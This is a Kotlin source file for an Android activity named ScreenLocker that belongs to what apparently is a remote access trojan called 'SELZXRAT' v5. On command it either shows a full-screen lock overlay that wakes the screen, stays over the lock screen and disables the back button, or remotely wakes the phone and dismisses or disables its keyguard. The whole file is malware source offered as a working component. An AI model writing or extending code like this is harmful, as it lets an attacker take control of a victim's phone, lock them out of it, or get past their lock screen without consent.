package com.selzxrat.v5.services

import android.app.Activity
import android.app.KeyguardManager
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.view.View
import android.view.WindowManager
import android.widget.Button
import android.widget.TextView
import com.selzxrat.v5.R

class ScreenLocker : Activity() {

    private lateinit var keyguardManager: KeyguardManager
    private lateinit var powerManager: PowerManager

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
        powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager

        val action = intent?.getStringExtra("action") ?: "lock"

        when (action) {
            "lock" -> lockScreen()
            "unlock" -> unlockScreen()
            else -> finish()
        }
    }

    private fun lockScreen() {
        setContentView(R.layout.activity_screen_lock)
        window.addFlags(
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setTurnScreenOn(true)
            setShowWhenLocked(true)
            keyguardManager.requestDismissKeyguard(this, null)
        }

        // Lock screen UI
        val tvLockMessage = findViewById<TextView>(R.id.tvLockMessage)
        val btnUnlock = findViewById<Button>(R.id.btnUnlock)

        btnUnlock.setOnClickListener {
            if (keyguardManager.isKeyguardLocked) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    // DIPERBAIKI: Ditambahkan tanda kurung () setelah KeyguardDismissCallback
                    keyguardManager.requestDismissKeyguard(this, object : KeyguardManager.KeyguardDismissCallback() {
                        override fun onDismissSucceeded() { finish() }
                        override fun onDismissCancelled() { /* still locked */ }
                        override fun onDismissError() { /* error */ }
                    })
                }
            } else {
                finish()
            }
        }
    }

    private fun unlockScreen() {
        val wakeLock = powerManager.newWakeLock(
            PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
            "SELZXRAT:WakeLock"
        )
        wakeLock.acquire(5000)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setTurnScreenOn(true)
            setShowWhenLocked(true)
            // DIPERBAIKI: Ditambahkan tanda kurung () setelah KeyguardDismissCallback
            keyguardManager.requestDismissKeyguard(this, object : KeyguardManager.KeyguardDismissCallback() {
                override fun onDismissSucceeded() {
                    wakeLock.release()
                    finish()
                }
                override fun onDismissCancelled() { wakeLock.release(); finish() }
                override fun onDismissError() { wakeLock.release(); finish() }
            })
        } else {
            @Suppress("DEPRECATION")
            val keyguard = keyguardManager.newKeyguardLock("SELZXRAT")
            keyguard.disableKeyguard()
            wakeLock.release()
            finish()
        }
    }

    override fun onBackPressed() {
        // Block back button on lock screen
    }
}
